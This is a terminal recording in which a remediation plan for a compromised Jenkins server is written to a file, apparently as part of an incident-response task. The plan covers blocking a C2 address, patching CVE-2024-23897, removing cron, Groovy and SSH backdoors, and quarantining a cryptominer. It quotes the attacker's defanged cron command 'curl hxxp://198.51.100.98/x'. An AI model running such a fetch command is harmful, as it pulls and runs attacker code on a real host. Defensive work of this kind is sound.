[162.963528, "i", "cat <<'EOF' > /app/remediation-plan.md\n# Incident Remediation & Recovery Plan\n\n## 1. Overview & Remediation Policy\nThis remediation plan outlines the step-by-step procedures to neutralize attacker persistence, isolate malicious binaries, fix baseline configuration flaws, and patch the entry vulnerability on `jenkins-prod-01`.\nIn accordance with incident response best practices and rule directives:\n- **Backup / Quarantine First:** All malicious files, backdoors, and binaries must be quarantined/backed up before removal.\n- **Evidence Citation:** Every remediation target is backed by evidence found during forensic analysis on `/disk` and `/sas`.\n- **No Direct Remediation Execution:** This document represents the official plan for change implementation.\n\n## 2. Reconciled Change Ticket CHG-1700\n\n| # | Action | Target | Status | Citation & Note |\n|---|--------|--------|--------|-----------------|\n| 1 | Block malicious C2 IP inbound and outbound | `198.51.100.98` | PROPOSED | `/sas/cti/advisory.txt:6` & `/disk/var/spool/cron/crontabs/jenkins:5` (Replaced stale IP `203.0.113.9` with confirmed attacker IP `198.51.100.98`) |\n| 2 | Patch CVE-2024-23897 (Upgrade Jenkins Controller) | Jenkins Core (LTS >= 2.426.3) | PROPOSED | `/sas/vulns.json:3` & `/sas/cti/advisory.txt:17` (Corrected wrong CVE-2019-0708 / BlueKeep to CVE-2024-23897) |\n| 3 | Remove malicious cron job persistence | `/var/spool/cron/crontabs/jenkins` (line 5) | OPEN | `/disk/var/spool/cron/crontabs/jenkins:5` (Downgraded from `DONE` to `OPEN`; line 5 still active on disk image) |\n| 4 | Remove silent Groovy init hook backdoor | `/var/lib/jenkins/init.groovy.d/z-backdoor.groovy` | PROPOSED | `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3` (Added missing silent persistence hook) |\n| 5 | Remove silent SSH backdoor key | `/var/lib/jenkins/.ssh/authorized_keys` | PROPOSED | `/disk/var/lib/jenkins/.ssh/authorized_keys:2` (Added missing silent SSH key backdoor) |\n| 6 | Terminate & quarantine cryptominer process and binary | `/opt/jenkins/.xmr/xmrig` | PROPOSED | `/disk/opt/jenkins/.xmr/xmrig:1` & `/sas/alerts.json:9` (Added missing cryptominer quarantine step) |\n| 7 | Re-enable Jenkins Security Realm and Authentication | `/var/lib/jenkins/config.xml` | PROPOSED | `/disk/var/lib/jenkins/config.xml:3` & `/sas/baseline.json:3` (Added missing configuration hardening step) |\n| 8 | Quarantine/Clean RCE Artifact | `/var/lib/jenkins/jobs/.tmp/config.xml` | PROPOSED | `/disk/var/lib/jenkins/jobs/.tmp/config.xml:3` & `/sas/alerts.json:2` (Added missing RCE artifact cleanup) |\n\n## 3. Detailed Phase-by-Phase Remediation Plan\n\n### Phase 1: Immediate Network & Perimeter Isolation\n1. **Block Attacker IP:**\n   - Action: Add firewall drop rules for `198.51.100.98` at network perimeter and host `iptables`/`ufw`.\n   - Citation: `/sas/cti/advisory.txt:6`, `/disk/var/spool/cron/crontabs/jenkins:5`\n   - Verification: Verify `iptables -L -n -v | grep 198.51.100.98` shows drop counters incrementing or blocking traffic.\n\n### Phase 2: Host Persistence Containment & Quarantine\n2. **Quarantine Groovy Init Hook Backdoor:**\n   - Action: Move `/var/lib/jenkins/init.groovy.d/z-backdoor.groovy` to quarantine backup directory `/var/backups/quarantine/z-backdoor.groovy.bak` with permissions `000`.\n   - Citation: `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`\n   - Verification: Confirm file no longer exists in `/var/lib/jenkins/init.groovy.d/` and Jenkins restart logs show no reverse shell invocation.\n\n3. **Sanitize Crontab File:**\n   - Action: Backup `/var/spool/cron/crontabs/jenkins` to `/var/backups/quarantine/jenkins.crontab.bak`, then remove line 5 containing `curl hxxp://198.51.100.98/x` while preserving legitimate ops jobs (lines 2-4: `backup.sh`, `logrotate`, `check-health.sh`).\n   - Citation: `/disk/var/spool/cron/crontabs/jenkins:5`\n   - Verification: Run `crontab -u jenkins -l` and ensure line 5 is completely absent.\n\n4. **Revoke Unauthorized SSH Authorized Keys:**\n   - Action: Backup `/var/lib/jenkins/.ssh/authorized_keys` to quarantine, then remove the attacker's public key en"]
[162.963566, "i", "try (`ssh-ed25519` / `ssh-rsa`).\n   - Citation: `/disk/var/lib/jenkins/.ssh/authorized_keys:2`\n   - Verification: Test SSH access using the backdoor key to confirm rejection.\n\n5. **Stop & Quarantine Cryptominer Binary:**\n   - Action: Terminate process pid 1337 (`xmrig`) if active, and move `/opt/jenkins/.xmr/` to `/var/backups/quarantine/xmr_directory.bak`.\n   - Citation: `/disk/opt/jenkins/.xmr/xmrig:1`, `/sas/alerts.json:9`\n   - Verification: Verify process list (`ps aux | grep xmrig`) is clear and CPU usage returns to normal baseline levels.\n\n6. **Quarantine RCE Artifact:**\n   - Action: Move `/var/lib/jenkins/jobs/.tmp/config.xml` to `/var/backups/quarantine/config.xml.bak`.\n   - Citation: `/disk/var/lib/jenkins/jobs/.tmp/config.xml:3`\n   - Verification: Check `/var/lib/jenkins/jobs/.tmp/` is clear of residual exploit artifacts.\n\n### Phase 3: Vulnerability Patching & Configuration Hardening\n7. **Patch CVE-2024-23897:**\n   - Action: Upgrade Jenkins package to version LTS 2.426.3 or higher.\n   - Citation: `/sas/vulns.json:3`, `/sas/cti/advisory.txt:17`\n   - Verification: Check Jenkins version via web management interface or package manager (`dpkg -l jenkins`).\n\n8. **Enable Security Realm:**\n   - Action: Update `/var/lib/jenkins/config.xml` to set `<useSecurity>true</useSecurity>` and configure proper authentication realm.\n   - Citation: `/disk/var/lib/jenkins/config.xml:3`, `/sas/baseline.json:3`\n   - Verification: Access Jenkins web interface from unauthenticated browser session and confirm redirect to login prompt.\nEOF\n"]
[162.964078, "o", "cat <<'EOF' > /app/remediation-plan.md"]
